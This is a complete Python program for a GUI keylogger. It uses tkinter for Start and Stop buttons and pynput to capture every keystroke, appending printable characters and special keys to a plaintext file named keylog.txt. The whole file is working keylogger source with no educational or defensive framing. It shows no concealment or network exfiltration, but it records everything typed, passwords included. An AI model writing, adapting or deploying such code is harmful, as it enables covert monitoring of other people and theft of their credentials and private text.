import tkinter as tk
from tkinter import messagebox
from pynput import keyboard

# Variables for keylogging state
logging = False
log_file = "keylog.txt"
listener = None

def on_press(key):
    """Callback function for key presses."""
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f"[{key}]")

def start_logging():
    """Start the keylogger."""
    global logging, listener
    if not logging:
        logging = True
        start_button.config(state=tk.DISABLED)
        stop_button.config(state=tk.NORMAL)
        listener = keyboard.Listener(on_press=on_press)
        listener.start()
        status_label.config(text="Logging started...")

def stop_logging():
    """Stop the keylogger."""
    global logging, listener
    if logging:
        logging = False
        start_button.config(state=tk.NORMAL)
        stop_button.config(state=tk.DISABLED)
        listener.stop()
        status_label.config(text="Logging stopped.")

# Create the main window
root = tk.Tk()
root.title("Keylogger")

# Create and place widgets
tk.Label(root, text="Keylogger").pack(pady=10)
start_button = tk.Button(root, text="Start Logging", command=start_logging)
start_button.pack(pady=5)
stop_button = tk.Button(root, text="Stop Logging", command=stop_logging, state=tk.DISABLED)
stop_button.pack(pady=5)
status_label = tk.Label(root, text="Press 'Start Logging' to begin.")
status_label.pack(pady=10)

# Run the main loop
root.mainloop()
